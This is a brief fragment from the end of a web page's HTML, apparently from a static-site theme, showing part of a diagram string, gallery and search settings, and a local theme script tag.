|No| CL[calc]\n    CL --\u003e R"},"lightgallery":true,"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
